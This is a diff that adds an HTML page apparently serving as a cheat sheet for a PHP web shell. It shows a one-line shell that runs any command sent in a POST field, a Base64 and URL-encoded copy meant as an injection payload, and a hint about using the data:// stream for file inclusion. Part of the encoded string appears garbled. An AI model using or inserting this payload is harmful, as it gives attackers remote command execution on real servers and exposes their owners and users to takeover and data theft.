@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PHP Shell in a web-page</title>
+</head><body>Maybe requires data:// php stream? <br/>
+<br/>
+&lt;form action="&lt;?=$_SERVER['REQUEST_URI']?&gt;" method="POST"&gt;&lt;input type="text" name="x" value="&lt;?=htmlentities($_POST['x'])?&gt;"&gt;&lt;input type="submit" value="cmd"&gt;&lt;/form&gt;&lt;pre&gt;&lt;? echo `{$_POST['x']}`; ?&gt;&lt;/pre&gt;&lt;? die(); ?&gt;<br/>
+<br/>
+Base64 + URL encoded payload<br/>
+PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D<br/>
+<br/>
+<img src="image.png" /><br/>
+</body></html>
